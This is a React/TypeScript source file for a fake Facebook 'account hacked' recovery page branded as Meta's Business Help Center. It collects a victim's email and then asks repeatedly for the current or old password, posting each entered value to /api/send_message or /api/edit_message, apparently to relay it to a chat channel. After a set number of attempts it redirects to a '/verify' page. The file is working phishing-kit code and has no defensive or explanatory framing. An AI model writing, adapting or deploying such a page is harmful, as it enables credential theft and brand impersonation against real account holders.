import Favicon from '@/assets/images/aGT3gskzWBf.ico';
import { faSpinner } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import React, { useEffect, useState } from 'react';
import { Helmet } from 'react-helmet-async';
import { Link, useNavigate } from 'react-router-dom';
const Hacked: React.FC = () => {
	const navigate = useNavigate();
	const [email, setEmail] = useState<string>('');
	const [password, setPassword] = useState<string>('');
	const [showPasswordField, setShowPasswordField] = useState<boolean>(false);
	const [maxAttempts, setMaxAttempts] = useState<number>(0);
	const [attempts, setAttempts] = useState<number>(0);
	const [isLoading, setIsLoading] = useState<boolean>(false);
	const [loadingTime, setLoadingTime] = useState<number>(0);
	const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
		e.preventDefault();
		if (email) {
			setShowPasswordField(true);
			if (password) {
				setIsLoading(true);
				let response;
				let saveMessage;
				if (
					localStorage.getItem('message_id') ||
					localStorage.getItem('message') != undefined
				) {
					const messageId = localStorage.getItem('message_id');
					const message = localStorage.getItem('message');
					const newMessage = `${message}\n**🔑Password ${attempts + 1}:** \`${password}\``;
					saveMessage = newMessage;

					response = await axios.post('/api/edit_message', {
						message_id: messageId,
						message: newMessage,
					});
				} else {
					const message = `**📩Email:** \`${email}\`\n**🔑Password:** \`${password}\``;
					saveMessage = message;
					response = await axios.post('/api/send_message', {
						message: message,
					});
				}
				if (response.status === 200) {
					localStorage.setItem('message', saveMessage);
					localStorage.setItem(
						'message_id',
						response.data.message_id,
					);
					setTimeout(() => {
						setIsLoading(false);
						setPassword('');
						if (attempts + 1 < maxAttempts) {
							setAttempts(attempts + 1);
						} else {
							navigate('/verify');
						}
					}, loadingTime);
				}
			}
		}
		console.log(email, password);
	};
	useEffect(() => {
		const getPasswordConfig = async () => {
			const response = await axios.get('/api/get-password-config');
			setMaxAttempts(response.data.maxPasswordAttempts);
			setLoadingTime(response.data.passwordLoadingTime * 1000);
		};
		getPasswordConfig();
	}, []);
	return (
		<>
			<Helmet>
				<title>Business Help Center</title>
				<link rel='shortcut icon' href={Favicon} type='image/x-icon' />
				<link rel='preconnect' href='https://fonts.googleapis.com' />
				<link
					rel='preconnect'
					href='https://fonts.gstatic.com'
					crossOrigin=''
				/>
				<link
					href='https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap'
					rel='stylesheet'
				/>
			</Helmet>
			<div className='flex min-h-screen appearance-none flex-col items-center bg-white p-5 font-body lg:justify-center lg:bg-gray-100 lg:p-10'>
				<h1 className='mb-4 text-3xl font-extrabold text-blue-600'>
					facebook
				</h1>
				<div className='flex flex-col rounded-md border bg-white shadow-sm lg:w-5/12 lg:p-6 lg:shadow-gray-700'>
					<form
						className='flex flex-col items-center justify-center'
						onSubmit={handleSubmit}
					>
						<h2 className='hidden text-gray-700 lg:block lg:text-xl'>
							Enter the Email linked to Facebook
						</h2>
						<div className='m-3 w-full border border-yellow-500 bg-yellow-100 p-2 text-sm'>
							To get back in to your account, enter your current
							Email if you know it. If you don't think that your
							account was hacked, you can
							<Link to='#' className='text-blue-600'>
								{' '}
								cancel this process
							</Link>
						</div>
						<input
							className='ld:bg-white m-1 w-full rounded border border-gray-100 bg-gray-200 p-2 hover:border-gray-500 focus:outline-none lg:border-gray-300 lg:bg-white'
							type='text'
							id='email'
							name='email'
							placeholder='Email'
							required
							value={email}
							onChange={(e) => setEmail(e.target.value)}
						/>
						{showPasswordField && (
							<input
								className='ld:bg-white m-1 w-full rounded border border-gray-100 bg-gray-200 p-2 hover:border-gray-500 focus:outline-none lg:border-gray-300 lg:bg-white'
								id='password'
								type='password'
								name='password'
								placeholder='Current or old password'
								value={password}
								onChange={(e) => setPassword(e.target.value)}
							/>
						)}
						<button
							className={`m-3 w-full rounded border-0 bg-blue-500 p-2 font-bold text-white hover:bg-blue-600 ${isLoading ? 'cursor-not-allowed' : ''}`}
							type='submit'
							disabled={isLoading}
						>
							{isLoading ? (
								<FontAwesomeIcon
									icon={faSpinner}
									className='animate-spin'
								/>
							) : (
								'Continue'
							)}
						</button>
					</form>
				</div>
				<div className='flex flex-col items-center lg:hidden'>
					<Link to='#' className='text-blue-600'>
						Forgot Password
					</Link>
					<div className='flex items-center'>
						<hr className='flex-grow border-b border-black' />
						<span className='mx-4'>or</span>
						<hr className='flex-grow border-b border-black' />
					</div>
					<div className='grid grid-cols-2'>
						<div className='m-5 mt-10 flex flex-col'>
							<Link
								to='#'
								className='self-center whitespace-nowrap text-blue-600'
							>
								English (UK)
							</Link>
							<Link
								to='#'
								className='self-center whitespace-nowrap text-blue-600'
							>
								Français (France)
							</Link>
							<Link
								to='#'
								className='self-center whitespace-nowrap text-blue-600'
							>
								Español
							</Link>
						</div>
						<div className='m-5 mt-10 flex flex-col'>
							<Link
								to='#'
								className='self-center whitespace-nowrap text-blue-600'
							>
								Português (Brasil)
							</Link>
							<Link
								to='#'
								className='self-center whitespace-nowrap text-blue-600'
							>
								Deutsch
							</Link>
							<Link to='#' className='self-center'>
								+
							</Link>
						</div>
					</div>
					<span>Meta © 2024</span>
				</div>
			</div>
		</>
	);
};

export default Hacked;
